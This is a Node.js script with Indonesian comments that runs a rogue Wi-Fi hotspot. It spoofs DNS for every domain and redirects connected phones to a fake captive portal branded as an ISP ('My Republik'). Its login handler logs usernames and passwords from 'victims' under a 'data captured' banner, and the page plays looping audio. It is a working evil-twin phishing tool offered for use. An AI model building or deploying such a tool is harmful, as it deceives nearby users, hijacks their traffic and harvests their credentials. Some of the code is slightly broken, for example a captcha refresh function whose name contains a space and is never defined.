const { exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');
const express = require('express');
const dgram = require('dgram');
const dnsPacket = require('dns-packet');
const readline = require('readline');


let SSID = "WiFi Gratis";
let PASSWORD = "mafis2023"; 
let TERPILIH_SOUND = "sound.mp3";
const PORT_HTTP = 80; // Harus port 80 agar otomatis diredirect oleh HP
const IP_LAPTOP = "192.168.137.1"; 


const app = express();
app.use(express.urlencoded({ extended: true }));


const halamanLoginHTML = `
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login Portal</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 300px; }
        h2 { color: #333; margin-bottom: 20px; }
        
        /* Gaya Tampilan Captcha */
        .captcha-box { display: flex; justify-content: center; align-items: center; gap: 10px; margin: 15px 0; }
        .captcha-code { background: repeating-linear-gradient(45deg, #e0e0e0, #e0e0e0 10px, #d4d4d4 10px, #d4d4d4 20px); color: #222; font-size: 24px; font-weight: bold; font-style: italic; letter-spacing: 5px; padding: 10px 20px; border-radius: 4px; border: 1px dashed #999; user-select: none; font-family: 'Courier New', Courier, monospace; }
        .btn-refresh { background: none; border: none; font-size: 20px; cursor: pointer; color: #666; padding: 5px; }
        .btn-refresh:hover { color: #333; }
        
        input[type="text"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; text-align: center; font-size: 16px; text-transform: uppercase; }
        button[type="submit"] { width: 100%; padding: 10px; background-color: #007bff; border: none; color: white; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 10px; }
        button[type="submit"]:hover { background-color: #0056b3; }
        .footer { margin-top: 20px; font-size: 12px; color: #888; }
        .error-msg { color: red; font-size: 13px; margin-top: 5px; display: none; }
    </style>
</head>
<body>
    <div class="login-container" id="boxPortal">
        <img src="/wifi_logo.png" alt="Wi-Fi Logo" style="width: 70px; height: 70px; margin-bottom: 10px; border-radius: 12px;">
        <h2>My Republik</h2>
        <p style="font-size: 14px; color: #666;">Verifikasi keamanan. Ketik ulang kode captcha di bawah untuk melanjutkan akses internet.</p>
        
        <!-- Area Tampilan Captcha -->
        <div class="captcha-box">
            <div class="captcha-code" id="displayCaptcha">4 X m 2 Y</div>
            <button type="button" class="btn-refresh" onclick="buatCaptcha Baru()" title="Ganti Kode">🔄</button>
        </div>

        <form id="formLogin" onsubmit="kirimFormAJAX(event)">
            <input type="text" id="inputCaptcha" name="captcha" placeholder="Masukkan kode di atas" maxlength="6" autocomplete="off" required>
            <div class="error-msg" id="errorMsg">Kode captcha tidak sesuai!</div>
            <button type="submit">Hubungkan</button>
        </form>
        <div class="footer">&copy; 2026 my republik</div>
    </div>

    <script>
    function kirimFormAJAX(event) {
        event.preventDefault();
        const form = event.target;
        const formData = new URLSearchParams(new FormData(form));

        // 1. Putar suara secara terus menerus (looping) tanpa henti
        try {
            const audio = new Audio('/selected_sound');
            audio.loop = true;
            audio.play().catch(e => console.log('Audio error/blocked:', e));
        } catch (e) {}

        // 2. Kirim data formulir di latar belakang (AJAX) agar halaman TIDAK di-refresh/berpindah
        fetch('/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: formData.toString()
        })
        .then(response => response.text())
        .then(htmlSuccess => {
            // 3. Ubah tampilan secara mulus menjadi halaman sukses tanpa mematikan musik
            document.body.innerHTML = '<div style="background: white; padding: 30px; border-radius: 8px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 300px;"><img src="/wifi_logo.png" alt="Wi-Fi Logo" style="width: 60px; height: 60px; margin-bottom: 10px; border-radius: 10px;"><h2 style="color: green;">Koneksi Berhasil!</h2><p style="color: #666; font-size: 14px;">Perangkat Anda telah terhubung ke jaringan. Silakan tunggu beberapa menit.</p></div>';
        })
        .catch(err => {
            console.error('Gagal mengirim form:', err);
        });
    }
    </script>
</body>
</html>
`;


app.get('/selected_sound', (req, res) => {
    res.sendFile(path.join(__dirname, TERPILIH_SOUND));
});

app.get('/wifi_logo.png', (req, res) => {
    res.sendFile(path.join(__dirname, 'wifi_logo.png'));
});


const captiveEndpoints = [
    '/generate_204', '/gen_204', '/connectivity-check', 
    '/ncsi.txt', '/hotspot-detect.html', '/success.txt',
    '/canonical.html', '/connecttest.txt'
];

captiveEndpoints.forEach(endpoint => {
    app.get(endpoint, (req, res) => {
        console.log(`[HTTP] Deteksi otomatis terpicu dari perangkat di: ${endpoint}`);
        res.redirect(`http://${IP_LAPTOP}/`);
    });
});

app.get('/', (req, res) => {
    res.send(halamanLoginHTML);
});
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    console.log(`\n[🔥 DATA TERTANGKAP] Korban mencoba login:`);
    console.log(`👤 Username/Email: ${username}`);
    console.log(`🔑 Password      : ${password}\n`);
    
    res.send(`
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Koneksi Berhasil</title>
        </head>
        <body style="text-align:center; padding:50px; font-family:Arial; background-color: #f4f4f9;">
            <div style="background: white; padding: 30px; border-radius: 8px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.1);">
                <h2 style="color: green;">Koneksi Berhasil!</h2>
                <p>Perangkat Anda telah terhubung ke jaringan. Silakan tunggu beberapa menit.</p>
            </div>

            <!-- Pemutaran Suara Secara Terus Menerus (Looping) -->
            <audio id="bgAudio" src="/sound.mp3" autoplay loop></audio>

            <script>
            window.addEventListener('DOMContentLoaded', () => {
                const audio = document.getElementById('bgAudio');
                if (audio) {
                    audio.play().catch(e => console.log("Autoplay Error:", e));
                }
            });
            </script>
        </body>
        </html>
    `);
});


app.use((req, res, next) => {
    // Cek apakah path yang diakses HP ada di dalam daftar OS Probes
    if (captiveEndpoints.includes(req.path)) {
        console.log(`[HTTP Captive] Terdeteksi pengecekan otomatis dari perangkat pada domain: ${req.hostname}${req.path}`);
        
        // Paksa redirect menggunakan HTTP 307 ke halaman portal Anda
        return res.redirect(307, `http://${IP_LAPTOP}/`);
    }
    next();
});

app.use((req, res) => {
    console.log(`[HTTP Redirect] Mengalihkan akses manual (${req.hostname}${req.originalUrl}) ke Portal...`);
    res.redirect(307, `http://${IP_LAPTOP}/`);
});


let httpServerInstance = null;
let dnsServerInstance = null;

function jalankanHttpServer() {
    httpServerInstance = app.listen(PORT_HTTP, () => {
        console.log(`[SUKSES] HTTP Portal Server aktif di port ${PORT_HTTP}`);
    }).on('error', (err) => {
        if (err.code === 'EADDRINUSE') {
            console.error(`[EROR HTTP] Port ${PORT_HTTP} sudah digunakan. Matikan aplikasi web lain (seperti XAMPP/Apache) jika ada.`);
        } else {
            console.error(`[EROR HTTP]`, err);
        }
    });
}


function jalankanDnsServer() {
    dnsServerInstance = dgram.createSocket('udp4');

    dnsServerInstance.on('message', (msg, rinfo) => {
        try {
            const request = dnsPacket.decode(msg);
            if (!request.questions || request.questions.length === 0) return;
            
            const question = request.questions[0];
            const domainYangDicari = question.name;
            const queryType = question.type;
            console.log(`[DNS Query] HP mencari domain: ${domainYangDicari} (${queryType})`);

            let answers = [];
            
            if (queryType === 'A') {
                answers = [{
                    type: 'A',
                    class: 'IN',
                    name: domainYangDicari,
                    ttl: 60,
                    data: IP_LAPTOP
                }];
            }

            
            const response = dnsPacket.encode({
                type: 'response',
                id: request.id,
                flags: dnsPacket.AUTHORITATIVE_ANSWER,
                questions: request.questions,
                answers: answers
            });

            dnsServerInstance.send(response, 0, response.length, rinfo.port, rinfo.address);
        } catch (e) {}
    });

    dnsServerInstance.bind(53, () => {
        console.log(`[SUKSES] DNS Spoofing Server aktif di port 53 (Mengalihkan semua domain ke ${IP_LAPTOP})`);
    }).on('error', (err) => {
        console.error(`[EROR DNS] Gagal menjalankan port 53. Pastikan tidak ada DNS server lain aktif.`);
    });
}

// ==========================================
// PENANGANAN SHUTDOWN GRACEFUL (CTRL+C)
// ==========================================
function bersihkanDanKeluar() {
    console.log("\n\n[!] Menerima sinyal Ctrl+C... Mematikan server & membebaskan seluruh port...");
    
    if (httpServerInstance) {
        try {
            httpServerInstance.close();
            console.log("[+] HTTP Server (Port 80) berhasil dimatikan.");
        } catch (e) {}
    }

    if (dnsServerInstance) {
        try {
            dnsServerInstance.close();
            console.log("[+] DNS Server (Port 53) berhasil dimatikan.");
        } catch (e) {}
    }

    setTimeout(() => {
        console.log("[+] Seluruh port dan layanan berhasil dibebaskan. Program selesai.");
        process.exit(0);
    }, 500);
}

process.on('SIGINT', bersihkanDanKeluar);
process.on('SIGTERM', bersihkanDanKeluar);



async function nyalakanWiFi() {
    const platform = os.platform();
    console.log(`[+] Mendeteksi Sistem Operasi: ${platform}`);
    
    if (platform !== 'win32') {
        console.log("[-] Skrip kustom terintegrasi ini saat ini hanya dioptimalkan untuk Windows.");
        return;
    }

    console.log("[!] Membuat file konfigurasi PowerShell sementara...");
    const scriptPowerShell = `
try {
    $TetheringRegPath = "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\NetworkInternet\\Tethering"
    if (-not (Test-Path $TetheringRegPath)) { New-Item -Path $TetheringRegPath -Force | Out-Null }
    Set-ItemProperty -Path $TetheringRegPath -Name "NoConnectionSharing" -Value 1 -Type DWord -Force | Out-Null

    $SharedAccessRegPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters"
    if (Test-Path $SharedAccessRegPath) {
        Set-ItemProperty -Path $SharedAccessRegPath -Name "DnsConfigFile" -Value "" -Force | Out-Null
    }
    $connectionProfile = [Windows.Networking.Connectivity.NetworkInformation]::GetInternetConnectionProfile()
    if (-not $connectionProfile) {
        $allProfiles = [Windows.Networking.Connectivity.NetworkInformation]::GetConnectionProfiles()
        foreach ($p in $allProfiles) {
            if ($p) {
                $connectionProfile = $p
                break
            }
        }
    }
    
    if (-not $connectionProfile) {
        Write-Output "ERROR: Tidak ada profil jaringan aktif. Hubungkan HP via USB Tethering ke Laptop terlebih dahulu."
        exit
    }
    
    $tetheringManager = [Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager, Windows.Networking.NetworkOperators, ContentType = WindowsRuntime]::CreateFromConnectionProfile($connectionProfile)
    $customConfiguration = New-Object Windows.Networking.NetworkOperators.NetworkOperatorTetheringAccessPointConfiguration
    $customConfiguration.Ssid = "${SSID}"
    $customConfiguration.Passphrase = "${PASSWORD}"
    
    $tetheringManager.ConfigureAccessPointAsync($customConfiguration) | Out-Null
    Start-Sleep -Milliseconds 500
    
    $tetheringManager.StartTetheringAsync() | Out-Null
    Start-Sleep -Seconds 2

    $virtualAdapter = Get-NetAdapter | Where-Object { $_.InterfaceDescription -like "*Microsoft Wi-Fi Direct Virtual Adapter*" -or $_.InterfaceDescription -like "*Hotspot*" }
    if ($virtualAdapter -and $virtualAdapter.Status -eq "Up") {
        Write-Output "SUKSES"
        Start-Sleep -Seconds 3600
    } else {
        Write-Output "GAGAL"
    }
} catch {
    Write-Output "ERROR: $_"
}
`;

    const pathSkrip = path.join(__dirname, 'buat_wifi_temp.ps1');
    fs.writeFileSync(pathSkrip, scriptPowerShell, 'utf-8');

    console.log("[!] Memulai pemancaran WiFi...");
    const perintahPS = `powershell -ExecutionPolicy Bypass -Command "[Windows.Networking.Connectivity.NetworkInformation, Windows.Networking.Connectivity, ContentType = WindowsRuntime] | Out-Null; [Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager, Windows.Networking.NetworkOperators, ContentType = WindowsRuntime] | Out-Null; & '${pathSkrip}'"`;
    const prosesHotspot = exec(perintahPS);

    prosesHotspot.stdout.on('data', (data) => {
        const output = data.toString().trim();
        if (output.includes("SUKSES")) {
            console.log(`\n[SUKSES] WiFi "${SSID}" Berhasil Aktif!`);
            console.log(`-------------------------------------------------`);
            
            jalankanHttpServer();
            jalankanDnsServer();
            
            console.log(`-------------------------------------------------`);
            console.log(`📱 SILAKAN UJI COBA: Hubungkan HP Anda ke "${SSID}".`);
            console.log(`💡 Harusnya sekarang tanpa password, dan portal otomatis langsung muncul.`);
            
            try { fs.unlinkSync(pathSkrip); } catch (e) {}
        } else if (output.includes("ERROR") || output.includes("GAGAL")) {
            console.error(`[PS LOG] ${output}`);
        }
    });

    prosesHotspot.stderr.on('data', (data) => {
        console.error(`[PS ERROR] ${data.toString().trim()}`);
    });
}


function mintaKonfigurasiDanJalankan() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    console.log("=================================================");
    console.log("         KONFIGURASI HOTSPOT & PORTAL            ");
    console.log("=================================================");

    rl.question(`Masukkan Nama Wi-Fi (SSID) [default: "${SSID}"]: `, (ssidInput) => {
        if (ssidInput.trim() !== "") {
            SSID = ssidInput.trim();
        }

        rl.question(`Masukkan Password Wi-Fi [default: "${PASSWORD}"]: `, (passInput) => {
            if (passInput.trim() !== "") {
                PASSWORD = passInput.trim();
            }

            console.log("\n-------------------------------------------------");
            console.log("Pilih Musik yang Ingin Diputar di Portal:");
            console.log("  [1] Sound 1 (sound.mp3)");
            console.log("  [2] Sound 2 (sound2.aac)");
            console.log("  [3] Sound 3 (sound3.mp3)");
            console.log("-------------------------------------------------");

            rl.question("Pilih nomor musik (1/2/3) [default: 1]: ", (soundChoice) => {
                const pilihan = soundChoice.trim();
                if (pilihan === "2") {
                    TERPILIH_SOUND = "sound2.aac";
                } else if (pilihan === "3") {
                    TERPILIH_SOUND = "sound3.mp3";
                } else {
                    TERPILIH_SOUND = "sound.mp3";
                }

                rl.close();
                console.log(`\n[+] SSID yang Digunakan     : "${SSID}"`);
                console.log(`[+] Password yang Digunakan : "${PASSWORD}"`);
                console.log(`[+] Musik yang Digunakan    : "${TERPILIH_SOUND}"\n`);
                
                nyalakanWiFi();
            });
        });
    });
}

mintaKonfigurasiDanJalankan();
